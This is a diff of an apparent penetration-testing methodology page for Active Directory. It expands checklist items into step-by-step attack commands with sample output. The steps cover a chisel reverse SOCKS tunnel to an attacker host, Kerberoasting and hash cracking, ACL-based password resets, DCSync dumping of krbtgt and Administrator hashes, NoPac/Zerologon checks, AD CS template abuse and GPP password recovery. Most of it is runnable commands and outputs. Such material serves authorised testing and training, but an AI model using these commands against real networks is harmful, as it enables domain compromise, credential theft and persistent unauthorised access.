@@ -613,15 +613,52 @@ jdoe --[CanPSRemote]--> FILE01.domain.local
 
 {% stepper %}
 {% step %}
-Run chisel for windows on the windows pivot host
+#### Establish a Tunnel
 
-1. connect with the linux chisel client on the attack host.
-2. modify the proxychain.conf file to match the proxy that is established.
-3. run command with proxychains
+Tunnel into segmented subnets through a pivot host with [ligolo-ng.md](../toolbox/tooling/network-tools/ligolo-ng.md "mention") or [chisel.md](../toolbox/tooling/post-exploitation/chisel.md "mention"). See [pivoting-tunnelling-and-port-forwarding](../field-manual/post-exploitation/pivoting-tunnelling-and-port-forwarding/ "mention").
+
+{% code title="Attacker" %}
+```bash
+chisel server -p 8080 --reverse
+```
+{% endcode %}
+
+{% code title="Pivot" %}
+```bash
+chisel client <attacker-ip>:8080 R:socks
+```
+{% endcode %}
+
+<mark style="color:$primary;">**What to look for:**</mark> confirmation the tunnel/agent connected and the SOCKS listener is up.
+
+```
+server: session#1: tun: Listening on 127.0.0.1:1080 (socks5)
+```
+
+<mark style="color:$primary;">**Next:**</mark> you can now route tools at the inner subnet > next step.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-Check bloodhound for CanRDP, CanPSRemote or SQLAdmin abilities forlateral movement.
+#### Route Tools Through the Proxy
+
+Point proxychains at the SOCKS proxy and run tooling through it. See [network-pivoting-with-socks.md](../field-manual/post-exploitation/pivoting-tunnelling-and-port-forwarding/socks-proxy-pivoting/network-pivoting-with-socks.md "mention").
+
+```bash
+# edit /etc/proxychains.conf -> socks5 127.0.0.1 1080
+proxychains nxc smb <internal-target> -u user -p 'pass'
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> `[proxychains] ... OK` chains and normal tool output from the inner network.
+
+```
+[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.5.5:445 ... OK
+```
+
+<mark style="color:$primary;">**Next:**</mark> re-run the whole enumeration flow from this new vantage point - the inner subnet is a fresh network.
+
+* [ ] Complete
 {% endstep %}
 {% endstepper %}
 
@@ -631,50 +668,153 @@ Check bloodhound for CanRDP, CanPSRemote or SQLAdmin abilities forlateral moveme
 
 {% stepper %}
 {% step %}
-look for kerberoastable accounts suing bloodhound, powerview, getuserspns.py
+#### Kerberoasting
+
+Request TGS tickets for SPN accounts and crack offline. See [kerberoasting-with-impacket-getuserspns.py.md](../field-manual/post-exploitation/privilege-escalation-1/kerberoasting/kerberoasting-with-impacket-getuserspns.py.md "mention").
+
+{% code overflow="wrap" %}
+```bash
+impacket-GetUserSPNs domain.local/user:'pass' -dc-ip <dc-ip> -request -outputfile kerb.hash
+```
+{% endcode %}
+
+<mark style="color:$primary;">**What to look for:**</mark> `$krb5tgs$` hashes. Prioritise accounts in privileged groups.
+
+```
+$krb5tgs$23$*svc_sql$DOMAIN.LOCAL$MSSQLSvc/sql01*$3f8a...
+```
+
+<mark style="color:$primary;">**Next:**</mark> crack - a hit yields that service account's plaintext:
+
+```bash
+hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
+```
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-grab all TGS tickets with GetUserSPNs.py, save to file and attempt to crack.
+#### ACL / DACL Abuse
+
+Abuse over-permissive ACEs to take over more principals. See [dacl-acl-abuse.md](../field-manual/exploitation/initial-access/dacl-acl-abuse.md "mention").
+
+1. <mark style="color:$primary;">**ForceChangePassword:**</mark> reset a target user's password
+2. <mark style="color:$primary;">**AddMember / GenericWrite on a group:**</mark> add yourself to a privileged group
+3. <mark style="color:$primary;">**GenericAll / GenericWrite on a user:**</mark> reset password, or set an SPN for a targeted Kerberoast
+4. <mark style="color:$primary;">**WriteDACL:**</mark> grant yourself DS-Replication rights (> DCSync)
+
+{% code title="e.g. targeted password reset from Linux" %}
+```bash
+net rpc password <victim> 'NewPass123!' -U domain.local/user%'pass' -S <dc-ip>
+```
+{% endcode %}
+
+<mark style="color:$primary;">**What to look for:**</mark> the command returning success with no error, then confirm the new access (`nxc smb <dc-ip> -u <victim> -p 'NewPass123!'`).
+
+<mark style="color:$primary;">**Next:**</mark> pivot to the newly controlled principal and re-run [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention") as them.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-Abuse any over permissive acl entries to gain control of more users and move laterally throughout the network.
+#### DCSync
 
-1. ForceChangePassword
-2. AddMember
-3. GeneralAll/GenericWrite
-4. Ds-Replpciation-GetChanges-All
-5. ACL Abuse
+With replication rights (or DA), pull hashes straight from the DC. See [dcsync.md](../field-manual/post-exploitation/privilege-escalation-1/dcsync.md "mention").
+
+```bash
+impacket-secretsdump domain.local/user:'pass'@<dc-ip> -just-dc-user krbtgt
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> NTLM hashes in `user:rid:lm:nt:::` form. The **krbtgt** hash enables golden tickets; the **Administrator** hash enables full PtH.
+
+```
+krbtgt:502:aad3b...:1a59bd44fd...:::
+Administrator:500:aad3b...:31d6cfe0...:::
+```
+
+<mark style="color:$primary;">**Next:**</mark> pass-the-hash as Administrator (> _Additional Methods_), or forge a golden ticket from the krbtgt hash.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-check for common vulnerabilities:
+#### Check for Common Vulnerabilities
 
-1. NoPac
-2. PrintNightmate
-3. PetitPotam
+Test discovered hosts for the high-impact AD CVEs where versions/patch levels fit.
+
+1. NoPac (CVE-2021-42278/42287)
+2. PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
+3. PetitPotam (coercion → relay to AD CS)
+4. Zerologon (CVE-2020-1472)
+
+```bash
+nxc smb <dc-ip> -u user -p 'pass' -M nopac
+nxc smb <dc-ip> -u user -p 'pass' -M zerologon
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> `VULNERABLE` module output.
+
+```
+NOPAC  10.10.10.5  DC01  VULNERABLE
+```
+
+<mark style="color:$primary;">**Next:**</mark> exploit the confirmed CVE per its Field Manual entry - several lead straight to SYSTEM/DA.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-Check for common misconfigurations to escalate privileges:
+#### Check for Common Misconfigurations
 
-1. exchange group permissions
-2. ms-rprn printer bug
-3. MS14-068
-4. sniff for LDAP credentials
-5. enumerate DNS records for interesting servers
-6. look for user passwords and other notes in AD user descriptions
-7. check for PASSWD\_NOTRREQD field on users and test for weak/no passwoords.
-8. Look for credentials and other interesting files on SMB shares.
-9. check for DONT\_REQ\_PREAUTH field and ASREPRoasting any discovered users.
-10. Check for GPOs that we have write access over to gain administrator rights or more latterally.
-11. Resource based constrained delegation, constrained delegation, unconstrained delegation
-12. active directory certificate services attacks
+Work through the recurring privilege-escalation misconfigurations:
+
+1. Exchange group rights (`Exchange Windows Permissions` > WriteDACL on domain)
+2. MS-RPRN / MS-EFSRPC printer-bug coercion
+3. MS14-068 (legacy Kerberos PAC)
+4. Sniff for LDAP credentials
+5. Enumerate DNS records for interesting internal servers
+6. Read user/computer `description` fields for cleartext creds
+7. Check `PASSWD_NOTREQD` users and test for weak/empty passwords
+8. Hunt credentials and interesting files on SMB shares
+9. Check `DONT_REQ_PREAUTH` and AS-REP roast any discovered users
+10. Writable GPOs - see [group-policy-object-gpo-abuse.md](../field-manual/exploitation/initial-access/group-policy-object-gpo-abuse.md "mention")
+11. Delegation - RBCD / constrained / unconstrained - see [kerberos-delegation-abuse.md](../field-manual/exploitation/initial-access/kerberos-delegation-abuse.md "mention")
+12. AD CS (ESC1–ESC16) - see [adcs-attack.md](../field-manual/exploitation/initial-access/adcs-attack.md "mention")
+
+```bash
+certipy find -u user@domain.local -p 'pass' -dc-ip <dc-ip> -vulnerable -stdout
+```
+
+<mark style="color:$primary;">**What to look for (ADCS example):**</mark> a template flagged vulnerable with an ESC category.
+
+```
+Template Name : VulnTemplate
+[!] Vulnerabilities : ESC1 - Enrollee supplies subject
+```
+
+<mark style="color:$primary;">**Next:**</mark> exploit the specific ESCx path to obtain a certificate you can authenticate as a privileged user with.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-check for group policy regerences GPP passwords.
+#### Group Policy Preferences (GPP) Passwords
+
+Check SYSVOL for GPP `cpassword` values - AES-encrypted with a Microsoft-published static key, so trivially decrypted.
+
+```bash
+nxc smb <dc-ip> -u user -p 'pass' -M gpp_password
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> a found `cpassword` and its decrypted value.
+
+```
+GPP_PASS  Found groups.xml -> user: svc_deploy  password: Summer2022!
+```
+
+<mark style="color:$primary;">**Next:**</mark> test the recovered credential across the domain (`nxc smb <range> -u svc_deploy -p 'Summer2022!'`).
+
+* [ ] Complete
 {% endstep %}
 {% endstepper %}
 
